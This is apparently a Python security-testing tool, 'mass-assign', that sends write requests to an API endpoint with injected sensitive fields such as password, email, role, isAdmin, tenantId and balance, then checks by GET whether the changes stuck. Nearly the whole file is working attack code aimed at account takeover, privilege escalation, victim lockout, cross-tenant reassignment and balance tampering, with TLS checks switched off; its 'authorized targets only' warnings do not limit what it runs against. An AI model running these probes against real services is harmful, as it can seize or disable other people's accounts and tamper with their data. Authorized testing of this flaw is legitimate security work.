#!/usr/bin/env python3
"""
mass-assign — turn a boring write into a critical chain. Given an object you can
write (a PUT/POST/PATCH that accepts an id in the body/path), probe the sensitive
fields the endpoint was never meant to accept — the mass-assignment / autobinding
class that promotes a plain IDOR into ATO, privilege-escalation, lockout, or
cross-tenant compromise.

This automates the exact depth that made a real finding pay: an update endpoint
that also accepted `password`, `type`, `active`, `email` → full account takeover.

For each candidate field it sends the write with that field injected, then (when
--verify-get is given) re-reads the object and checks the value actually stuck —
that reflection is the difference between "204, maybe ignored" and a confirmed bug.

Impact classes flagged:
  ATO           password/email fields accepted        (critical)
  PRIVESC       role/type/isAdmin/permissions          (critical/high)
  ACCOUNT_STATE active/enabled/locked/banned            (high — lockout/DoS)
  TRUST_BYPASS  verified/emailVerified/kyc              (high)
  CROSS_TENANT  tenantId/orgId/ownerId/userId           (high/critical)
  FINANCIAL     balance/credit/points/amount            (high)

Usage:
  mass-assign.py --url https://api.acme.com/system/v1/user/update \
      --method PUT --id-field id --id <victim-uuid> --token BEARER \
      [--data '{"name":"x"}'] [--verify-get https://api.acme.com/system/v1/user/{id}] \
      [--fields extra1,extra2] [--json]

Mutates state — authorized targets only, throwaway/test objects, and restore what
you change. Never runs the password/email writes against accounts you don't own.
Exit: 0 nothing accepted · 1 accepted field(s).
"""
import sys, re, json, time, ssl
from pathlib import Path
from urllib.request import Request, build_opener, HTTPSHandler, HTTPHandler
from urllib.error import HTTPError
import urllib.parse


def arg(n, d=None):
    return sys.argv[sys.argv.index(n) + 1] if n in sys.argv else d
def flag(n):
    return n in sys.argv


def ctx():
    c = ssl.create_default_context()
    c.check_hostname = False
    c.verify_mode = ssl.CERT_NONE
    return c


# field name → (impact_class, severity, probe_value)
SENSITIVE = [
    # ATO
    ("password", "ATO", "critical", "Hunter@Massassign1!"),
    ("passwd", "ATO", "critical", "Hunter@Massassign1!"),
    ("newPassword", "ATO", "critical", "Hunter@Massassign1!"),
    ("new_password", "ATO", "critical", "Hunter@Massassign1!"),
    ("email", "ATO", "high", "massassign-probe@example.com"),
    ("emailAddress", "ATO", "high", "massassign-probe@example.com"),
    ("new_email", "ATO", "high", "massassign-probe@example.com"),
    # PRIVESC
    ("role", "PRIVESC", "critical", "admin"),
    ("roleId", "PRIVESC", "critical", "1"),
    ("role_id", "PRIVESC", "critical", "1"),
    ("type", "PRIVESC", "high", "1"),
    ("userType", "PRIVESC", "high", "1"),
    ("level", "PRIVESC", "high", "1"),
    ("accessLevel", "PRIVESC", "high", "admin"),
    ("isAdmin", "PRIVESC", "critical", True),
    ("admin", "PRIVESC", "critical", True),
    ("is_admin", "PRIVESC", "critical", True),
    ("is_staff", "PRIVESC", "high", True),
    ("is_superuser", "PRIVESC", "critical", True),
    ("superuser", "PRIVESC", "critical", True),
    ("permissions", "PRIVESC", "high", ["*"]),
    ("authorities", "PRIVESC", "high", ["ROLE_ADMIN"]),
    ("scopes", "PRIVESC", "high", ["admin"]),
    # ACCOUNT_STATE
    ("active", "ACCOUNT_STATE", "high", False),
    ("enabled", "ACCOUNT_STATE", "high", False),
    ("isActive", "ACCOUNT_STATE", "high", False),
    ("disabled", "ACCOUNT_STATE", "high", True),
    ("locked", "ACCOUNT_STATE", "high", True),
    ("banned", "ACCOUNT_STATE", "high", True),
    ("suspended", "ACCOUNT_STATE", "high", True),
    ("status", "ACCOUNT_STATE", "medium", "disabled"),
    # TRUST_BYPASS
    ("verified", "TRUST_BYPASS", "high", True),
    ("emailVerified", "TRUST_BYPASS", "high", True),
    ("email_verified", "TRUST_BYPASS", "high", True),
    ("isVerified", "TRUST_BYPASS", "high", True),
    ("confirmed", "TRUST_BYPASS", "medium", True),
    ("kyc", "TRUST_BYPASS", "high", True),
    ("kycVerified", "TRUST_BYPASS", "high", True),
    # CROSS_TENANT / ownership
    ("tenantId", "CROSS_TENANT", "critical", "00000000-0000-0000-0000-000000000000"),
    ("tenant_id", "CROSS_TENANT", "critical", "00000000-0000-0000-0000-000000000000"),
    ("orgId", "CROSS_TENANT", "high", "1"),
    ("organizationId", "CROSS_TENANT", "high", "1"),
    ("companyId", "CROSS_TENANT", "high", "1"),
    ("ownerId", "CROSS_TENANT", "high", "1"),
    ("owner", "CROSS_TENANT", "high", "1"),
    ("userId", "CROSS_TENANT", "high", "1"),
    ("createdBy", "CROSS_TENANT", "medium", "1"),
    # FINANCIAL
    ("balance", "FINANCIAL", "high", 999999),
    ("credit", "FINANCIAL", "high", 999999),
    ("credits", "FINANCIAL", "high", 999999),
    ("points", "FINANCIAL", "high", 999999),
    ("wallet", "FINANCIAL", "high", 999999),
    ("amount", "FINANCIAL", "medium", 999999),
]

IMPACT_NOTE = {
    "ATO": "accepted → set another user's credential → account takeover",
    "PRIVESC": "accepted → escalate your own/other users' privilege level",
    "ACCOUNT_STATE": "accepted → deactivate/lock a victim account (DoS)",
    "TRUST_BYPASS": "accepted → mark unverified data as verified (trust bypass)",
    "CROSS_TENANT": "accepted → reassign ownership/tenant (cross-tenant compromise)",
    "FINANCIAL": "accepted → tamper with balance/credit fields",
}


def send(url, method, headers, body, timeout=10):
    opener = build_opener(HTTPSHandler(context=ctx()), HTTPHandler())
    data = body.encode() if isinstance(body, str) else body
    req = Request(url, data=data, headers=headers, method=method.upper())
    try:
        with opener.open(req, timeout=timeout) as r:
            raw = r.read(65536)
            return r.status, len(raw), raw.decode("utf-8", "ignore")
    except HTTPError as e:
        try:
            raw = e.read(8192)
        except Exception:
            raw = b""
        return e.code, len(raw), raw.decode("utf-8", "ignore")
    except Exception as ex:
        return 0, 0, str(ex)[:200]


def build_body(base_obj, id_field, id_val, field, value):
    obj = dict(base_obj)
    if id_val is not None:
        obj[id_field] = id_val
    obj[field] = value
    return json.dumps(obj)


# credential fields never come back on a GET — confirm these by logging in, not reflection
WRITE_ONLY = {"password", "passwd", "pwd", "newPassword", "new_password"}


def values_match(got, want):
    if isinstance(want, bool):
        return got is want or str(got).lower() == str(want).lower()
    if isinstance(want, (list, dict)):
        return got == want
    return str(got) == str(want)


def field_reflected(obj, field, value):
    """True only if some key == field holds the injected value (recurses wrappers)."""
    if isinstance(obj, dict):
        for k, v in obj.items():
            if k == field and values_match(v, value):
                return True
            if field_reflected(v, field, value):
                return True
    elif isinstance(obj, list):
        return any(field_reflected(it, field, value) for it in obj)
    return False


def main():
    url = arg("--url")
    method = arg("--method", "PUT")
    id_field = arg("--id-field", "id")
    id_val = arg("--id")
    token = arg("--token")
    data_tpl = arg("--data")
    verify_get = arg("--verify-get")
    extra = arg("--fields")

    if not url:
        print(__doc__)
        sys.exit(0)

    try:
        base_obj = json.loads(data_tpl) if data_tpl else {}
        if not isinstance(base_obj, dict):
            base_obj = {}
    except Exception:
        base_obj = {}

    headers = {"User-Agent": "Mozilla/5.0", "Accept": "*/*", "Content-Type": "application/json"}
    if token:
        headers["Authorization"] = token if " " in token else f"Bearer {token}"

    fields = list(SENSITIVE)
    if extra:
        for name in [e.strip() for e in extra.split(",") if e.strip()]:
            fields.append((name, "CUSTOM", "medium", "massassign_test"))

    # baseline write (no injected sensitive field) to learn the success shape
    base_body = build_body(base_obj, id_field, id_val, "_massassign_noop", "x")
    b_status, b_size, _ = send(url, method, headers, base_body)
    success_codes = {200, 201, 204}
    print(f"[mass-assign] {method} {url}  baseline HTTP {b_status}", file=sys.stderr)

    findings = []
    for field, impact, severity, value in fields:
        body = build_body(base_obj, id_field, id_val, field, value)
        s, z, resp = send(url, method, headers, body)
        if s not in success_codes:
            continue
        # confirmation
        confirmed = None            # None = accepted but unconfirmed
        if verify_get and id_val:
            if field in WRITE_ONLY:
                confirmed = None    # can't observe on GET — confirm by login
            else:
                gurl = verify_get.replace("{id}", urllib.parse.quote(str(id_val), safe=""))
                _gs, _gz, gbody = send(gurl, "GET", headers, None)
                try:
                    parsed = json.loads(gbody)
                except Exception:
                    parsed = gbody
                confirmed = field_reflected(parsed, field, value) if isinstance(parsed, (dict, list)) else False
                if confirmed is False:
                    continue        # server ignored the field — not a finding, drop the noise
        rec = {
            "field": field, "impact": impact, "severity": severity,
            "status": s, "value": value if not isinstance(value, (list, dict)) else json.dumps(value),
            "reflected": confirmed,
            "note": f"'{field}' {IMPACT_NOTE.get(impact, 'accepted on write')}"
                    + (" — CONFIRMED stuck on GET" if confirmed is True
                       else (" — accepted; confirm by logging in (write-only)" if field in WRITE_ONLY
                             else " — accepted (add --verify-get to confirm it stuck)")),
        }
        findings.append(rec)
        mark = "✓CONFIRMED" if confirmed is True else "·accepted"
        print(f"  {mark}  {impact:<13} {field}={value}  HTTP {s}", file=sys.stderr)

    # rank confirmed-first, then by severity
    sev_rank = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    findings.sort(key=lambda f: (f["reflected"] is not True, sev_rank.get(f["severity"], 9)))

    confirmed_n = sum(1 for f in findings if f["reflected"] is True)
    result = {
        "ts": time.strftime("%Y-%m-%d %H:%M"),
        "url": url, "method": method, "id": id_val,
        "baseline_status": b_status,
        "total": len(findings), "confirmed": confirmed_n,
        "impacts": sorted({f["impact"] for f in findings if f["reflected"] is not False}),
        "findings": findings,
    }

    if flag("--json"):
        print(json.dumps(result))
        sys.exit(1 if findings else 0)

    print(f"\n== mass-assign · {url} ==")
    print(f"  accepted {len(findings)} sensitive field(s) · {confirmed_n} CONFIRMED reflected")
    for f in findings:
        tag = "CONFIRMED" if f["reflected"] is True else ("accepted" if f["reflected"] is None else "not-reflected")
        print(f"  [{f['severity'].upper():<8}] {f['impact']:<13} {f['field']:<16} ({tag})")
    if confirmed_n:
        print("\n  chain candidates:", ", ".join(result["impacts"]))
    if not findings:
        print("  no sensitive fields accepted — endpoint validates its write DTO.")
    print("\n  [mass-assign] mutates state — restore what you changed; authorized targets only.")
    sys.exit(1 if findings else 0)


if __name__ == "__main__":
    main()
